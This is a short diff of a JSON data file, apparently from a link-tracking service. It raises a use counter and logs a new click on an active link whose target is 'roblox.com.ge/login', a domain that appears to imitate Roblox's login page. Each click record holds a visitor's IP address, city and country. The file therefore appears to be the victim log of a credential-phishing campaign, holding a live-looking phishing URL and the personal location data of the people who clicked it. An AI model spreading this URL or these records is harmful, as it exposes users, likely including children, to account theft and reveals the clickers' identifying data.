@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1054,
+    "useCount": 1055,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8550,6 +8550,14 @@
         "ip": "72.49.69.245",
         "country": "United States",
         "city": "Cincinnati",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1777239293593,
+        "ip": "73.104.57.27",
+        "country": "United States",
+        "city": "Jacksonville",
         "flag": "🇺🇸",
         "countryCode": "US"
       }
